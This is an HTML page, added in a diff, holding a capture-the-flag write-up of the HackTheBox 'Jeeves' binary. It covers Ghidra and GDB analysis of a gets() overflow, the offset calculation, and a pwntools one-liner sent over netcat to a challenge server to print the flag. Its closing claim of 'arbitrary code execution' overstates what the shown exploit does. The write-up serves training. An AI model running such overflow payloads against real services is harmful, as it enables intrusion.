@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HackTheBox: Jeeves - Binary Exploitation | Elliot Hacks</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <meta content="Binary exploitation walkthrough of HackTheBox Jeeves machine. Buffer overflow, Ghidra reverse engineering, GDB analysis." name="description">
+    <meta content="hackthebox, jeeves, binary exploitation, buffer overflow, ghidra, gdb, pwn" name="keywords">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            font-family: 'Heebo', sans-serif;
+            color: #e0e0e0;
+            line-height: 1.7;
+        }
+        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.02; pointer-events: none; }
+        .matrix-column { position: absolute; top: -100%; font-family: 'Fira Code', monospace; font-size: 12px; color: #00ff41; animation: matrix-fall linear infinite; }
+        @keyframes matrix-fall { 0% { top: -100%; } 100% { top: 100%; } }
+        .navigation-header { background: rgba(0, 0, 0, 0.95); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(0, 255, 65, 0.3); position: fixed; width: 100%; top: 0; z-index: 1000; }
+        .nav-link-cyber { color: #00ff41 !important; transition: all 0.3s; }
+        .nav-link-cyber:hover { color: #39ff14 !important; text-shadow: 0 0 10px #00ff41; }
+        .writeup-container { margin-top: 100px; min-height: 100vh; }
+        .writeup-header { background: linear-gradient(45deg, rgba(0, 0, 0, 0.8), rgba(26, 26, 46, 0.6)); border: 1px solid rgba(0, 255, 65, 0.3); border-radius: 20px; padding: 2rem; margin-bottom: 2rem; }
+        .writeup-title { font-size: 2.5rem; font-weight: 900; color: #00ff41; text-shadow: 0 0 30px rgba(0, 255, 65, 0.5); font-family: 'Orbitron', monospace; }
+        .content-card { background: rgba(0, 0, 0, 0.8); border: 1px solid rgba(0, 255, 65, 0.2); border-radius: 15px; padding: 2rem; margin-bottom: 2rem; }
+        .content-card h2 { color: #00ff41; font-family: 'Orbitron', monospace; border-left: 4px solid #00ff41; padding-left: 1rem; margin-bottom: 1.5rem; }
+        .content-card h3 { color: #39ff14; font-family: 'Fira Code', monospace; margin-top: 1.5rem; }
+        .code-block { background: #0a0a0a; border: 1px solid #00ff41; border-radius: 10px; padding: 1rem; font-family: 'Fira Code', monospace; font-size: 0.85rem; overflow-x: auto; margin: 1rem 0; }
+        .terminal { background: #0c0c0c; border-left: 4px solid #00ff41; padding: 1rem; font-family: 'Fira Code', monospace; font-size: 0.85rem; color: #00ff41; }
+        .flag { background: rgba(0, 255, 65, 0.1); border: 1px solid #00ff41; border-radius: 10px; padding: 0.5rem 1rem; font-family: 'Fira Code', monospace; color: #00ff41; display: inline-block; }
+        .tag { background: rgba(0, 255, 65, 0.1); border: 1px solid rgba(0, 255, 65, 0.3); border-radius: 20px; padding: 0.2rem 0.8rem; font-size: 0.8rem; font-family: 'Fira Code', monospace; color: #00ff41; display: inline-block; }
+        .warning { background: rgba(255, 165, 0, 0.1); border-left: 4px solid #ffa500; padding: 1rem; margin: 1rem 0; }
+        @media (max-width: 768px) { .writeup-title { font-size: 1.8rem; } .code-block { font-size: 0.7rem; } }
+    </style>
+</head>
+
+<body>
+    <div class="matrix-bg" id="matrix"></div>
+
+    <header class="navigation-header py-3">
+        <div class="container">
+            <div class="d-flex justify-content-between align-items-center">
+                <a href="../../" class="h3 mb-0 nav-link-cyber text-decoration-none">
+                    <i class="fas fa-terminal me-2"></i>@elliot-hacks
+                </a>
+                <nav class="d-none d-md-flex gap-4">
+                    <a href="../../" class="nav-link-cyber text-decoration-none">Home</a>
+                    <a href="../../about.html" class="nav-link-cyber text-decoration-none">About</a>
+                    <a href="../index.html" class="nav-link-cyber text-decoration-none">Publications</a>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <div class="container writeup-container">
+        <div class="writeup-header">
+            <h1 class="writeup-title">HackTheBox: Jeeves</h1>
+            <div class="mt-3">
+                <span class="tag"><i class="fas fa-microchip me-1"></i>Binary Exploitation</span>
+                <span class="tag ms-2"><i class="fas fa-tag me-1"></i>Linux</span>
+                <span class="tag ms-2"><i class="fas fa-chart-simple me-1"></i>Medium</span>
+                <span class="tag ms-2"><i class="fas fa-bug me-1"></i>Buffer Overflow</span>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-microchip me-2"></i>Binary Analysis with Ghidra</h2>
+            <p>The binary was disassembled using Ghidra to understand the program's logic. The key finding: if a specific buffer value equals a certain constant, the program prints the contents of <code class="text-success">flag.txt</code>.</p>
+            <div class="warning">
+                <i class="fas fa-info-circle me-2"></i> The binary checks if a value at <code>[rbp-0x4]</code> equals <code class="text-warning">0x1337bab3</code>. If true, it prints the flag.
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-bug me-2"></i>GDB Reverse Engineering</h2>
+            <p>Using GDB with GEF to analyze memory layout and identify the offset between input buffer and the target variable:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">gef➤ disassemble main
+Dump of assembler code for function main:
+  0x00000000000011e9 <+0>:     endbr64
+  0x00000000000011ed <+4>:     push   rbp
+  0x00000000000011ee <+5>:     mov    rbp,rsp
+  0x00000000000011f1 <+8>:     sub    rsp,0x40
+  0x00000000000011f5 <+12>:    mov    DWORD PTR [rbp-0x4],0xdeadc0d3
+  0x0000000000001211 <+40>:    lea    rax,[rbp-0x40]      # Input buffer
+  0x0000000000001214 <+43>:    mov    rdi,rax
+  0x0000000000001219 <+48>:    call   0x10d0 <gets@plt>    # Vulnerable!
+  0x0000000000001236 <+77>:    cmp    DWORD PTR [rbp-0x4],0x1337bab3
+  0x000000000000123d <+84>:    jne    0x12a8 <main+191></pre>
+            </div>
+            <p>The input is read using <code class="text-danger">gets()</code>, which is vulnerable to buffer overflow. The target variable is at <code>[rbp-0x4]</code>.</p>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-calculator me-2"></i>Calculating the Offset</h2>
+            <p>Using GDB to find memory addresses and calculate the exact offset:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">gef➤ search-pattern ElliotAlderson
+[+] In '[stack]'(0x7ffffffdd000-0x7ffffffff000)
+ 0x7fffffffda40 - 0x7fffffffda4e  →  "ElliotAlderson"
+
+gef➤ search-pattern 0xdeadc0d3
+[+] In '[stack]'(0x7ffffffdd000-0x7ffffffff000)
+ 0x7fffffffda7c - 0x7fffffffda8c  →  "\xd3\xc0\xad\xde"</pre>
+            </div>
+            <p>Calculating the difference in Python:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~]
+└──╼ $ python3
+>>> 0x7fffffffda7c - 0x7fffffffda40
+<span class="flag">60</span></pre>
+            </div>
+            <p>The offset between the input buffer and the target variable is <strong class="text-success">60 bytes</strong>.</p>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-code me-2"></i>Payload Crafting</h2>
+            <p>Creating a test flag.txt for Proof of Concept:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/Desktop/HTB]
+└──╼ $ echo "htb{elliothacks}" > flag.txt</pre>
+            </div>
+            <p>Crafting the exploit payload locally:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/Desktop/HTB]
+└──╼ $ python3 -c "import sys,pwn; sys.stdout.buffer.write((b'A'*60)+pwn.p64(0x1337bab3))" | ./jeeves
+
+Hello, good sir!
+May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAA...��7, hope you have a good day!
+Pleased to make your acquaintance. Here's a small gift: <span class="flag">htb{elliothacks}</span></pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-network-wired me-2"></i>Remote Exploitation</h2>
+            <p>Adding a newline character for the netcat connection:</p>
+            <div class="code-block">
+                <pre style="margin:0; color:#00ff41;">┌─[elliot@parrot]─[~/Desktop/HTB]
+└──╼ $ python3 -c "import sys,pwn; sys.stdout.buffer.write((b'A'*60)+pwn.p64(0x1337bab3)+b'\n')" | nc 83.136.254.158 51896
+
+Hello, good sir!
+May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAA...��7, hope you have a good day!
+Pleased to make your acquaintance. Here's a small gift: <span class="flag">HTB{w3lc0me_t0_lAnd_0f_pwn_&_pa1n!}</span></pre>
+            </div>
+        </div>
+
+        <div class="content-card">
+            <h2><i class="fas fa-clipboard-list me-2"></i>Key Takeaways</h2>
+            <ul>
+                <li><strong class="text-success">Buffer Overflow</strong> - Exploiting unsafe <code>gets()</code> function</li>
+                <li><strong class="text-success">Ghidra Analysis</strong> - Static analysis to understand program logic</li>
+                <li><strong class="text-success">GDB/ GEF</strong> - Dynamic analysis for memory offset calculation</li>
+                <li><strong class="text-success">pwntools</strong> - Python library for exploit development</li>
+                <li><strong class="text-success">Stack Layout</strong> - Understanding variable positions on the stack</li>
+            </ul>
+            <hr>
+            <p class="mb-0"><i class="fas fa-shield-alt me-2"></i>This challenge demonstrates classic stack-based buffer overflow where controlling a specific stack variable leads to arbitrary code execution.</p>
+        </div>
+    </div>
+
+    <script>
+        function createMatrixRain() {
+            const matrix = document.getElementById('matrix');
+            const chars = '01';
+            for (let i = 0; i < 30; i++) {
+                const col = document.createElement('div');
+                col.className = 'matrix-column';
+                col.style.left = Math.random() * 100 + '%';
+                col.style.animationDuration = (Math.random() * 4 + 2) + 's';
+                col.style.animationDelay = Math.random() * 5 + 's';
+                let text = '';
+                for (let j = 0; j < 15; j++) text += chars.charAt(Math.floor(Math.random() * chars.length)) + '<br>';
+                col.innerHTML = text;
+                matrix.appendChild(col);
+            }
+        }
+        createMatrixRain();
+    </script>
+</body>
+</html>
